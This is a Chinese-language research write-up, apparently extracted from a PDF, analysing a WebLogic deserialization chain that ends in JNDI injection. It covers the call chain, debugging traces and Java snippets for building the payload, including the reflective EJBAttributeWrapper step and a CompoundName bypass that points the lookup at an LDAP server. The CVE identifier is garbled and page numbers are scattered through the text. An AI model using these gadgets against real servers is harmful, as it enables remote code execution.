1
CVE-OLOO-ONPSL
反序列化利⽤链，JNDI注⼊ 
10.3.6.0.0 
12.1.3.0.0 
12.2.1.3.0 
12.2.1.4.0 
测试版本12.2.1.4.0 
之前有师傅的⽂章已经分析过了，给出调⽤堆栈 
漏洞介绍 
漏洞评级 
影响范围 
安全版本 
漏洞分析 
12.2.1.4.0 
2
从这⾥调⽤链能看出，他基本都是JDK或weblogic⼀个包的，没有像2555/2883那样还需要依赖
coherence，能⼤⼤提⾼不同版本的利⽤兼容性。 
⽬前测试下来12.1.3/12.2.1.3/12.2.1.4⽤⼀个包就能打 
这⾥记录下⾃⼰的调试记录吧，⽅便后续查阅 
⼊⼝点还是之前的  javax.management.BadAttributeValueExpException.readObject  
从val变量⾥取出对象，这⾥变量是  FileSessionData 对象，然后调⽤他的  toString()
Java
复制代码
javax.management.BadAttributeValueExpException.readObject()
    weblogic.servlet.internal.session.SessionData.toString()
 weblogic.servlet.internal.session.SessionData.isDebuggingSession()
            weblogic.servlet.internal.session.SessionData.getAttribute()
 weblogic.servlet.internal.session.SessionData.getAttributeInternal()
 weblogic.servlet.internal.session.AttributeWrapperUtils.unwrapObject()
 weblogic.servlet.internal.session.AttributeWrapperUtils.unwrapEJBObjects
()
 weblogic.ejb.container.internal.BusinessHandleImpl.getBusinessObject()
 weblogic.ejb20.internal.HomeHandleImpl.getEJBHome()
                                    javax.naming.Context.lookup()
1
2
3
4
5
6
7
8
9
10
3
FileSessionData 是继承  SessionData ，这⾥的toString没被重写，所以调⽤的是⽗类的，进
⽽调⽤  this.isDebuggingSession()  
registry.isProductionMode() 没法在本地反序列化测试，因为⾥⾯涉及到⼀些变量需要
weblogic运⾏时初始化，所以这⾥没法本地调试。 
接着会调⽤  this.getAttribute 获取  wl_debug_session  
4
这⾥  getSecurityModuleAttribute 返回是null，因为他是  name="weblogic.formauth.tar
geturl" 才有值。所以调⽤ this.getAttributeInternal  
this.attributes 是⼀个Map，实现类是ConcurrentHashMap，获取  wl_debug_session 的
value，这⾥是  AttributeWrapper 对象 
接着调⽤  AttributeWrapperUtils.unwrapObject 解封装。 
5
AttributeWrapper 对象封装的是  BusinessHandlerImpl 类，解封装后，还需要判断  wrappe
r.isEJBObjectWrapped() 是否为true，才能继续调⽤  unwrapEJBObjects  
所以需要⼿动  setEJBObjectWrapped(true)  
6
unwrapEJBObjects ⾥有四个分⽀，如果是BusinessHandle的实现类，才能调⽤  getBusinessO
bject()  
PS: 这个部分，其实BusinessHandle、HomeHandle和Handle三个都能触发，任选其⼀。 
this.homeHandle 是  HomeHandleImpl 类，然后调⽤  getEJBHome()  
7
最终到了sink点，  ctx.lookup ，这⾥有两个变量要设置，this.serverURL和this.jndiName，就是
JNDI请求那⼀套。 
这个版本有些不同 
在  SessionData.getAttributeInternal ⾥，原本是先调⽤  AttributeWrapperUtils.unw
rapObject ,然后才是判断unwrappedObject属于哪个接⼝，进⾏转换。 
10.3.6跳过中间步骤，直接判断。 
10.3.6 
8
但这⾥多了⼀个  var3 instanceof EJBAttributeWrapper  判断，原来payload⾥是直接⽤
AttributeWrapper 
EJBAttributeWrapper 也是  AttributeWrapper 继承类，但注意这个类是私有类，只能通过反
射来实例化。 
9
所以该部分注释原来的，调整如下 
10
但注意因为SeesionData的不同，会导致suid不同，所以在打不同版本需要调⽤不同版本的jar包，这玩
意⼤得很，要优化就是筛选出有⽤的Class来类加载，回头优化再说吧。 
PS: 新版本没有EJBAttributeWrapper类了。 
漏洞利⽤的最后阶段，这⾥会发起JNDI请求，⼀般来说我们习惯⽤LDAP或RMI，但这⾥做了限制。 
java.naming.provider.url 这个值其实不太影响。 
我们利⽤的通常是ctx.lookup指定向我们的ldap/rmi发起请求，但这⾥this.jndiName是Name接⼝，⽽
不是⼀个String。 
该⽅法存在重载 
JNDI注⼊部分问题 
Java
复制代码
Constructor ejbAttributeWrapperC = 
Class.forName("weblogic.servlet.internal.session.EJBAttributeWrapper").ge
tDeclaredConstructor(BusinessHandle.class);
ejbAttributeWrapperC.setAccessible(true);
Object ejbAttributeWrapper = 
ejbAttributeWrapperC.newInstance(businessHandle);
//        AttributeWrapper attributeWrapper =  new 
AttributeWrapper(businessHandle);
//       attributeWrapper.setEJBObjectWrapped(true);
Map map = new ConcurrentHashMap();
map.put("wl_debug_session", ejbAttributeWrapper);
1
2
3
4
5
6
7
8
9
11
那么就有两种思路 
1. url设置成我们server，那么后⾯jndiName就不影响了。 
2. url任意指定，只要连接server成功，jndiName构造转换成和传⼊String⼀样的效果，也能实现。 
第⼀种⽅法 
因为weblogic.jndi.WLInitialContextFactory，url的scheme在weblogic我们是⽤T3/IIOP。 
这⾥注册了其他协议，但实际也只能⽤t3/iiop，所以要有恶意的T3/IIOP server才能利⽤成功，也就是
攻击T3/IIOP client，这⾥⽬前来说没找到有⽤的资料和实现。 
12
备注： 
13
C
复制代码
getInstance:42, EnvironmentManager (weblogic.jndi.spi)
getContext:353, Environment (weblogic.jndi)
getContext:322, Environment (weblogic.jndi)
getInitialContext:131, WLInitialContextFactory (weblogic.jndi)
getInitialContext:684, NamingManager (javax.naming.spi)
getDefaultInitCtx:313, InitialContext (javax.naming)
init:244, InitialContext (javax.naming)
:216, InitialContext (javax.naming)
getEJBHome:66, HomeHandleImpl (weblogic.ejb20.internal)
getBusinessObject:160, BusinessHandleImpl 
(weblogic.ejb.container.internal)
unwrapEJBObjects:149, AttributeWrapperUtils 
(weblogic.servlet.internal.session)
unwrapObject:122, AttributeWrapperUtils 
(weblogic.servlet.internal.session)
getAttributeInternal:568, SessionData (weblogic.servlet.internal.session)
getAttribute:547, SessionData (weblogic.servlet.internal.session)
isDebuggingSession:1525, SessionData (weblogic.servlet.internal.session)
toString:1537, SessionData (weblogic.servlet.internal.session)
readObject:86, BadAttributeValueExpException (javax.management)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:2136, ObjectInputStream (java.io)
readOrdinaryObject:2027, ObjectInputStream (java.io)
readObject0:1535, ObjectInputStream (java.io)
readObject:422, ObjectInputStream (java.io)
readObject:73, InboundMsgAbbrev (weblogic.rjvm)
read:45, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:325, MsgAbbrevJVMConnection (weblogic.rjvm)
init:219, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:557, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:666, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:397, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:993, SocketMuxer (weblogic.socket)
readReadySocket:929, SocketMuxer (weblogic.socket)
process:599, NIOSocketMuxer (weblogic.socket)
processSockets:563, NIOSocketMuxer (weblogic.socket)
run:30, SocketReaderRequest (weblogic.socket)
execute:43, SocketReaderRequest (weblogic.socket)
execute:147, ExecuteThread (weblogic.kernel)
run:119, ExecuteThread (weblogic.kernel)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
14
所以第⼀种⽅法放弃。 
第⼆种⽅法 
既然url只能设置成iiop/t3，那就直接指向本地，如iiop://127.0.0.1:7001 
⽽this.jndiName就需要构造了 
先看了下传⼊String的情况，解析name的协议，根据scheme来获取对应协议context 
Java
复制代码
Hashtable p = new Hashtable();
p.put("java.naming.factory.initial", 
"weblogic.jndi.WLInitialContextFactory");
p.put("java.naming.provider.url", url);
Context ctx = new InitialContext(p);
this.home = 
(EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.jndiName), 
EJBHome.class);
1
2
3
4
5
6
15
如ldap，获取到的就是  com.sun.jndi.url.ldap.ldapURLContext ，然后调⽤
ldapURLContext.lookup 
再看下  getURLOrDefaultInitCtx(Name name) ，这⾥多了⼀步从name.get(0)⾥获取url来解
析，后续都⼀样 
然后看看ldapURLContext.lookup，重载的⽅法基本没区别，也是get(0) 
这⾥注意url⾥不要有  ? ，否则会抛异常 
16
⽗类的lookup，传⼊Name接⼝的，只要解析⻓度为1，进⽽会调⽤String的lookup，后⾯流程就⼀样
了。 
17
所以现在只需要有⼀个Name的实现类，解析我们构造的字符串后，解析⻓度为1，get(0) => 
"ldap://x.x.x.x:1389/xxx"即可 
如下实现类均在JDK⾥
经过测试 
18
DnsName: 以  . 分割字符串，传⼊www.baidu.com会变为["www","baidu", "com"]，不可⽤ 
LdapName：会以  , 分割，并判断是否有  = ，能正常解析的格式是dc=example,dc=com，不可⽤ 
CompositeName: 会以  / 分割，所以传⼊ldap://x.x.x.x，会被分割成["ldap","","x.x.x.x"]，不可⽤ 
CompoundName: 这个和CompositeName相似，但分割符可以⾃定义，那么就可以找个特殊符号，就
不会被分割了。 
⽹上的⼀个例⼦，这样就会以@分割， 其他属性可参考  javax.naming.NameImpl.recordNaming
Convention()  
当然，如果不设置属性，就默认为null，不做解析 
Java
复制代码
// need properties for CompoundName 
Properties props = new Properties(); 
props.put("jndi.syntax.separator", "@"); 
props.put("jndi.syntax.direction", "left_to_right"); 
// create compound name object 
CompoundName CompoundName1 = new CompoundName("x@y@z@M@n", props); 
1
2
3
4
5
6
7
19
20
所以对应payload修改如下，serverURL就指向server本地，让连接正常通过即可，jndiName就通过
CompoundName构造。 
其他注意事项 
Java
复制代码
Properties props = new Properties();
Name name = new CompoundName("ldap://127.0.0.1:1389",props);
this.getURLOrDefaultInitCtx(name).lookup(name);
1
2
3